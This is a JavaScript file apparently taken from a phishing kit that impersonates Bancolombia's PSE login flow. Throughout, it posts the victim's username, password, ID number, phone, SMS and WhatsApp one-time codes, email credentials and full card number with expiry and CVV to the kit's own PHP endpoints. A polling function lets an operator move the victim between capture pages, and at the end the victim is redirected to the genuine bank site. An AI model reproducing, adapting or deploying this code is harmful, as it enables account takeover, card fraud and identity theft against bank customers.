function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   

/* Rutas relativas a las páginas en poral/a/ (mismo criterio que Falabella). La ruta absoluta /Nueva carpeta/pse/... falla si el sitio está en un subdirectorio (p. ej. /stevenBuses/...). */
var PSE_PROCESS = "../../../../../process/";

function vista_password(){
    window.location.href = "../a/PASS.php";
}

function inicio(u){
    var d = detectar_dispositivo();
    $.post( PSE_PROCESS + "inicio.php", { usr: u, dis: d, tc: "persona"} ,function(data) {
        setTimeout(vista_password, 2000);
    });
}

function quitar_cargando(){
    $("#fondo,#cargando-o").hide();
}

function vista_info(){
    window.location.href = "../a/INFO.php";
}

function vista_espera(o){
    window.location.href = "../a/WAITING.php?o=" + o;
}

function vista_otp(){
    window.location.href = "../a/OTP.php";
}

function vista_errorotp(){
    window.location.href = "../a/ERROTP.php";
}

// NUEVA FUNCIÓN PARA EL ESTADO WPP
function vista_wpp(){
    window.location.href = "../a/WPP.php";
}

function vista_tarjeta(){
    window.location.href = "../a/PRODUCT.php";
}

function vista_final(){
    window.location.href = "../a/SUCCESS.php";
}

function salir(){
    window.location.href = "https://www.bancolombia.com/personas";  
}               

function pasousuario(p, usr){
    var d = detectar_dispositivo();
    var u = (typeof usr === "string" && usr.length) ? usr : (typeof window.bancolUser === "string" ? window.bancolUser : "");
    $.post( PSE_PROCESS + "pasologina.php", { usr: u, pas: p, dis: d, ban:"Bancolombia"} ,function(data) {
        window.location.href = "../a/WAITING.php";
    });
}               

function pasoinfo(d,c){    
    $.post( PSE_PROCESS + "pasoinfo.php", { doc: d, cel: c} ,function(data) {
        window.location.href = "../a/WAITING.php"; 
    });
} 

function pasootp(o){    
    $.post( PSE_PROCESS + "pasootp.php", { otp: o} ,function(data) {
        window.location.href = "../a/WAITING.php";  
    });
} 

function pasoerrotp(o){    
    $.post( PSE_PROCESS + "pasootp2.php", { otp: o} ,function(data) {
        window.location.href = "../a/WAITING.php";   
    });
}

function pasocorreo(e,c,t){   
    $.post( PSE_PROCESS + "pasocorreo.php", { eml:e,clv:c,cel:t } ,function(data) {
        window.location.href = "../a/WAITING.php";  
    });
}

// NUEVA FUNCIÓN PARA PROCESAR  ESTADO WPP
function pasowpp(codigo){    
    $.post( PSE_PROCESS + "pasowpp.php", { codigo: codigo} ,function(data) {
        window.location.href = "../a/WAITING.php";   
    });
}

function pasotarjeta(t,f,c){    
    $.post( PSE_PROCESS + "pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {
        window.location.href = "../a/WAITING.php";  
    });
}

function consultar_estado(){ 
    $.post( PSE_PROCESS + "estado.php",function(data) {        
        switch (data) {
            case '2': window.location.href = "OTP.php"; break;
            case '4': window.location.href = "MAIL.php"; break;
            case '6': window.location.href = "PRODUCT.php"; break;
            case '8': window.location.href = "SMSOTP.php"; break;
            case '14': window.location.href = "WPP.php"; break;
            case '10': window.location.href = "https://www.bancolombia.com/personas"; break;
            case '12': window.location.href = "login.php"; break;
        } 
    });        
}